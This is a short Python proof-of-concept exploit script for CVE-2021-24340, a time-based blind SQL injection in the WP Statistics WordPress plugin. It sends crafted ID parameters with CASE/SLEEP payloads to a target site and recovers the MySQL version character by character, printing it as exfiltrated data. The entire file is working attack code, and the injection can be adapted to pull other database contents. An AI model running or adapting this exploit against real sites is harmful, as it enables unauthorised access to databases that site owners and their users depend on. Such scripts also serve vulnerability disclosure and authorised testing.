# -*- coding: utf-8 -*-
#!/usr/bin/python3
#
#
# Just a simple proof of concept exploit for CVE-2021-24340 to get the MySQL version number from the backend.
# Note #1: the timeout can be even something like 0.0001, so adjust accordingly if you get unexpected...timeouts... :)
# Note #2: Add headers if needed and modify the code below.
#
# Additional information: 
#  Over 600,000 Sites Impacted by WP Statistics Patch
#  https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
#

import sys
import time
import requests


startdate = time.strftime('%Y-%m-%d %H:%M:%S')

baseURL = sys.argv[1]
timeout = sys.argv[2]

#cookies = {"somecookie": "somevalue", "othercookie": "othervalue"}
#headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Connection": "close"}

print(startdate)
print("[*] Params:")
print("\t[*] BaseURL: " + baseURL)
print("\t[*] Timeout: " + str(timeout))

string = ""
for i in range(1,25):
    for char in range(1,122):
        starttm = time.time()

        testURL = baseURL + "?ID=1+OR+(CASE+WHEN+(select+ASCII((substring((select+version()),CNT,1)))%3dCHARID)+THEN+SLEEP(TIMEOUT)+ELSE+SLEEP(0)+END)&page=wps_pages_page&type=1".replace("CHARID",str(char)).replace("TIMEOUT",str(timeout)).replace("CNT",str(i))
        #responze = requests.get(testURL, headers=headers, cookies=cookies)
        responze = requests.get(testURL)
        endtm = time.time()
        if (endtm - starttm) > float(timeout):
            string+=chr(char)
            print(string)
            break

enddate = time.strftime('%Y-%m-%d %H:%M:%S')
print("[*] Exfiltrated data: " + string)
print(enddate)